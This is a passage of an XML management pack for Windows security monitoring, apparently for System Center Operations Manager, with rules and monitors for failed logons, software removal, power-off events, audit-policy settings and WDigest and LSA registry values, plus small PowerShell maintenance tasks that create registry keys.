            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">1074</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">User32</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[5]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>power off</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>1</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.SystemPoweredOff.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.SoftwareRemovedFromServer" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Application</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">11724</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">MsiInstaller</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>1</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.SoftwareRemovedFromServer.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data[Default='']/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoring.Failed.Login.Attempts.Collection" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName />
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4625</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Microsoft-Windows-Security-Auditing</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">3</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoring.Event.FailedLogin" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Custom</Category>
        <DataSources>
          <DataSource ID="FailedLogin" TypeID="SecurityMonitoring.Event.RepeatedFailedLogind.DS">
            <IntervalSeconds>300</IntervalSeconds>
            <Count>5</Count>
            <IPExclusion>DummyValue</IPExclusion>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="failedlogin" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>1</Severity>
            <AlertMessageId>$MPElement[Name="SecurityMonitoring.Event.FailedLogin.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/Count$</AlertParameter1>
              <AlertParameter2>$Data/Context/DataItem/EventDescription$</AlertParameter2>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/Params/Param[20]$</SuppressionValue>
            </Suppression>
            <Custom1>Source IP Address:$Data/Context/DataItem/Params/Param[20]$</Custom1>
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Exterior Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
    </Rules>
    <Tasks>
      <Task ID="SecurityMonitoring.PowerShell.Task.CreateUserWriteableRegKey" Accessibility="Internal" Enabled="true" Target="Windows!Microsoft.Windows.Computer" Timeout="300" Remotable="true">
        <Category>Maintenance</Category>
        <ProbeAction ID="Probe" TypeID="Windows!Microsoft.Windows.PowerShellProbe">
          <ScriptName>CreateRegKey.ps1</ScriptName>
          <ScriptBody>#This Task creates the following registry value: HKLM\software\SCOMSecurityMonitoringMP\DiscoverUserWriteableLocations for discovery. It's trigger only from console.

New-Item -Path HKLM:\Software -Name SCOMSecurityMonitoringMP 
New-Item -Path HKLM:\Software\SCOMSecurityMonitoringMP -Name DiscoverUserWriteableLocations
</ScriptBody>
          <SnapIns />
          <Parameters />
          <TimeoutSeconds>300</TimeoutSeconds>
          <StrictErrorHandling>true</StrictErrorHandling>
        </ProbeAction>
      </Task>
      <Task ID="SecurityMonitoring.PowerShell.Task.LAPSSetup" Accessibility="Internal" Enabled="true" Target="Windows!Microsoft.Windows.Computer" Timeout="300" Remotable="true">
        <Category>Maintenance</Category>
        <ProbeAction ID="Probe" TypeID="Windows!Microsoft.Windows.PowerShellProbe">
          <ScriptName>LapsSetup.ps1</ScriptName>
          <ScriptBody>#This Task installs the appropriate PowerShell Modules on the designated LAPS Reporting Server as well as creating the appropriate registry key for discovery.

#Create reg item
$Item = Get-Item -Path HKLM:\Software\SCOMSecurityMonitoringMP -ErrorAction SilentlyContinue
If (!$item)
{
New-Item -Path HKLM:\Software -Name SCOMSecurityMonitoringMP
New-Item -Path HKLM:\Software\SCOMSecurityMonitoringMP -Name DiscoverLaps
}
else 
{
New-Item -Path HKLM:\Software\SCOMSecurityMonitoringMP -Name DiscoverLaps
}


#Install PowerShell Module

Install-Module S.DS.P</ScriptBody>
          <SnapIns />
          <Parameters />
          <TimeoutSeconds>300</TimeoutSeconds>
          <StrictErrorHandling>true</StrictErrorHandling>
        </ProbeAction>
      </Task>
      <Task ID="SecurityMonitoring.PowerShell.Task.RemoveUserWriteableRegKey" Accessibility="Internal" Enabled="true" Target="Windows!Microsoft.Windows.Computer" Timeout="300" Remotable="true">
        <Category>Maintenance</Category>
        <ProbeAction ID="Probe" TypeID="Windows!Microsoft.Windows.PowerShellProbe">
          <ScriptName>RemoveRegKey.ps1</ScriptName>
          <ScriptBody>#This Task Removes the following registry value: HKLM\software\SCOMSecurityMonitoringMP\DiscoverUserWriteableLocations. It's trigger only from console.

Remove-Item HKLM:\Software\SCOMSecurityMonitoringMP\DiscoverUserWriteableLocations -Recurse</ScriptBody>
          <SnapIns />
          <Parameters />
          <TimeoutSeconds>300</TimeoutSeconds>
          <StrictErrorHandling>true</StrictErrorHandling>
        </ProbeAction>
      </Task>
    </Tasks>
    <Monitors>
      <AggregateMonitor ID="Security.Monitoring.DCAuditSettings" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal">
        <Category>ConfigurationHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </AggregateMonitor>
      <AggregateMonitor ID="Security.Monitoring.MemberServerAuditSettings" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.MemberServers" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </AggregateMonitor>
      <UnitMonitor ID="Security.Monitoring.Monitors.AuthenticationPackages" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ParentMonitorID="Health!System.Health.SecurityState" Remotable="true" Priority="Normal" TypeID="MultiStringRegMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <AlertSettings AlertMessage="Security.Monitoring.Monitors.AuthenticationPackages.AlertMessage">
          <AlertOnState>Error</AlertOnState>
          <AutoResolve>true</AutoResolve>
          <AlertPriority>Normal</AlertPriority>
          <AlertSeverity>Error</AlertSeverity>
        </AlertSettings>
        <OperationalStates>
          <OperationalState ID="RegValueBad" MonitorTypeStateID="RegValueBad" HealthState="Error" />
          <OperationalState ID="RegValueGood" MonitorTypeStateID="RegValueGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>300</IntervalSeconds>
          <SyncTime />
          <RegKey>hklm:\SYSTEM\CurrentControlSet\Control\Lsa</RegKey>
          <RegAttribute>Authentication Packages</RegAttribute>
          <RegValue>msv1_0</RegValue>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.IncludeCommandLineProcessCreationonMS" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="SecurityMonitoringMP.CommandLineAuditSetting" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="RegValueBad" MonitorTypeStateID="RegValueBad" HealthState="Warning" />
          <OperationalState ID="RegValueGood" MonitorTypeStateID="RegValueGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.IncludeCommandLineProcessCreationonDCs" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="SecurityMonitoringMP.CommandLineAuditSetting" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="RegValueBad" MonitorTypeStateID="RegValueBad" HealthState="Warning" />
          <OperationalState ID="RegValueGood" MonitorTypeStateID="RegValueGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="SecurityMonitoringMP.Health.EventCollectorMonitor" Accessibility="Public" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ParentMonitorID="Health!System.Health.AvailabilityState" Remotable="true" Priority="Normal" TypeID="Windows!Microsoft.Windows.CheckNTServiceStateMonitorType" ConfirmDelivery="false">
        <Category>Custom</Category>
        <AlertSettings AlertMessage="SecurityMonitoringMP.Health.EventCollectorMonitor_AlertMessageResourceID">
          <AlertOnState>Error</AlertOnState>
          <AutoResolve>true</AutoResolve>
          <AlertPriority>Normal</AlertPriority>
          <AlertSeverity>Error</AlertSeverity>
        </AlertSettings>
        <OperationalStates>
          <OperationalState ID="wecsvcServiceRunning" MonitorTypeStateID="Running" HealthState="Success" />
          <OperationalState ID="wecsvcServiceNotRunning" MonitorTypeStateID="NotRunning" HealthState="Error" />
        </OperationalStates>
        <Configuration>
          <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
          <ServiceName>Wecsvc</ServiceName>
          <CheckStartupType>true</CheckStartupType>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="SecurityMonitoringMP.WDigestRegConfiguredMonitor" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ParentMonitorID="Health!System.Health.SecurityState" Remotable="true" Priority="Normal" TypeID="SecurityMonitoringMP.RegValueMonitorType" ConfirmDelivery="true">
        <Category>Custom</Category>
        <AlertSettings AlertMessage="SecurityMonitoringMP.WDigestRegConfiguredMonitor_AlertMessageResourceID">
          <AlertOnState>Error</AlertOnState>
          <AutoResolve>true</AutoResolve>
          <AlertPriority>Normal</AlertPriority>
          <AlertSeverity>Error</AlertSeverity>
        </AlertSettings>
        <OperationalStates>
          <OperationalState ID="UseLogonCredentialValueGood" MonitorTypeStateID="RegValueGood" HealthState="Success" />
          <OperationalState ID="UseLogonCredentialValueBad" MonitorTypeStateID="RegValueBad" HealthState="Error" />
        </OperationalStates>
        <Configuration />
      </UnitMonitor>
      <UnitMonitor ID="SecurityMonitoringMP.UseLogonCredentialExistsMonitor" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ParentMonitorID="Health!System.Health.SecurityState" Remotable="true" Priority="Normal" TypeID="SecurityMonitoringMP.RegValueExistsMonitorType" ConfirmDelivery="true">
        <Category>Custom</Category>
        <AlertSettings AlertMessage="SecurityMonitoringMP.UseLogonCredentialExistsMonitor_AlertMessageResourceID">
          <AlertOnState>Error</AlertOnState>
          <AutoResolve>true</AutoResolve>
          <AlertPriority>Normal</AlertPriority>
          <AlertSeverity>Error</AlertSeverity>
        </AlertSettings>
        <OperationalStates>
          <OperationalState ID="UseLogonCredentialValueExists" MonitorTypeStateID="RegValueExists" HealthState="Success" />
          <OperationalState ID="UseLogonCredentialValueNotExists" MonitorTypeStateID="RegValueMissing" HealthState="Error" />
        </OperationalStates>
        <Configuration />
      </UnitMonitor>
      <UnitMonitor ID="SecurityMonitoringMP.Event.RepeatedLogonMonitor" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ParentMonitorID="Health!System.Health.SecurityState" Remotable="true" Priority="Normal" TypeID="Windows!Microsoft.Windows.RepeatedEventLogTimer2StateMonitorType" ConfirmDelivery="true">
        <Category>Custom</Category>
        <OperationalStates>
          <OperationalState ID="NotEnoughEvents" MonitorTypeStateID="TimerEventRaised" HealthState="Success" />
          <OperationalState ID="TooManyEvents" MonitorTypeStateID="RepeatedEventRaised" HealthState="Warning" />
        </OperationalStates>
        <Configuration>
          <RepeatedComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</RepeatedComputerName>
          <RepeatedLogName>Security</RepeatedLogName>
          <RepeatedExpression>
            <And>
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">4625</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
              <Expression>
                <Or>
                  <Expression>
                    <SimpleExpression>
                      <ValueExpression>
                        <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                      </ValueExpression>
                      <Operator>Equal</Operator>
                      <ValueExpression>
                        <Value Type="String">3</Value>
                      </ValueExpression>
                    </SimpleExpression>
                  </Expression>
                  <Expression>
                    <SimpleExpression>
                      <ValueExpression>
                        <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                      </ValueExpression>
                      <Operator>Equal</Operator>
                      <ValueExpression>
                        <Value Type="String">10</Value>
                      </ValueExpression>
                    </SimpleExpression>
                  </Expression>
                </Or>
              </Expression>
            </And>
          </RepeatedExpression>
          <Consolidator>
            <ConsolidationProperties />
            <TimeControl>
              <WithinTimeSchedule>
                <Interval>180</Interval>
              </WithinTimeSchedule>
            </TimeControl>
            <CountingCondition>
              <Count>5</Count>
              <CountMode>OnNewItemTestOutputRestart_OnTimerSlideByOne</CountMode>
            </CountingCondition>
          </Consolidator>
          <TimerWaitInSeconds>120</TimerWaitInSeconds>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="SecurityMonitoringMP.Event.SystemPendingRestart" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ParentMonitorID="Health!System.Health.AvailabilityState" Remotable="true" Priority="Normal" TypeID="Windows!Microsoft.Windows.2SingleEventLog2StateMonitorType" ConfirmDelivery="true">
        <Category>Custom</Category>
        <AlertSettings AlertMessage="SecurityMonitoringMP.Event.SystemPendingRestart_AlertMessageResourceID">
          <AlertOnState>Warning</AlertOnState>
          <AutoResolve>true</AutoResolve>
          <AlertPriority>Normal</AlertPriority>
          <AlertSeverity>Error</AlertSeverity>
          <AlertParameters>
            <AlertParameter1>$Data[Default='']/Context/EventDescription$</AlertParameter1>
          </AlertParameters>
        </AlertSettings>
        <OperationalStates>
          <OperationalState ID="NoRebootNeeded" MonitorTypeStateID="SecondEventRaised" HealthState="Success" />
          <OperationalState ID="RebootRequired" MonitorTypeStateID="FirstEventRaised" HealthState="Warning" />
        </OperationalStates>
        <Configuration>
          <FirstComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</FirstComputerName>
          <FirstLogName>System</FirstLogName>
          <FirstExpression>
            <And>
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">21</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
              <Expression>
                <RegExExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">PublisherName</XPathQuery>
                  </ValueExpression>
                  <Operator>ContainsSubstring</Operator>
                  <Pattern>WindowsUpdateClient</Pattern>
                </RegExExpression>
              </Expression>
            </And>
          </FirstExpression>
          <SecondComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</SecondComputerName>
          <SecondLogName>System</SecondLogName>
          <SecondExpression>
            <And>
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">1074</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">PublisherName</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="String">User32</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </And>
          </SecondExpression>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.AuditAccountLogonDC" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Logon</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.AuditAccountLogonMS" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Logon</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.DirectoryServiceChangeAuditing" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>ConfigurationHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Directory Service Changes</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.ProcessCreationMemberServer" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Process Creation</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.SecurityAudit.ProcessCreationDC" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>ConfigurationHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Process Creation</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.SGManagementDC" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Security Group Management</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC" Accessibility="Public" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Special Logon</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>Special Logon</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <UnitMonitor ID="Security.Monitoring.UserAccountMgmtMS" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ParentMonitorID="Health!System.Health.ConfigurationState" Remotable="true" Priority="Normal" TypeID="Security.Monitoring.AuditPolMonitorType" ConfirmDelivery="false">
        <Category>AvailabilityHealth</Category>
        <OperationalStates>
          <OperationalState ID="ResultBad" MonitorTypeStateID="ResultBad" HealthState="Warning" />
          <OperationalState ID="ResultGood" MonitorTypeStateID="ResultGood" HealthState="Success" />
        </OperationalStates>
        <Configuration>
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <SubCommandAuditSetting>User Account Management</SubCommandAuditSetting>
          <Result>Success and Failure</Result>
        </Configuration>
      </UnitMonitor>
      <DependencyMonitor ID="Security.Monitoring.AccountLogonForDC" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" ParentMonitorID="Security.Monitoring.DCAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" MemberMonitor="Security.Monitoring.AuditAccountLogonDC">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.AccountLogonForMS" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.MemberServers" ParentMonitorID="Security.Monitoring.MemberServerAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers" MemberMonitor="Security.Monitoring.AuditAccountLogonMS">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.DCDirectoryServicesAudit" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" ParentMonitorID="Security.Monitoring.DCAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" MemberMonitor="Security.Monitoring.DirectoryServiceChangeAuditing">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.MemberServerProcessCreation" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.MemberServers" ParentMonitorID="Security.Monitoring.MemberServerAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers" MemberMonitor="Security.Monitoring.ProcessCreationMemberServer">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
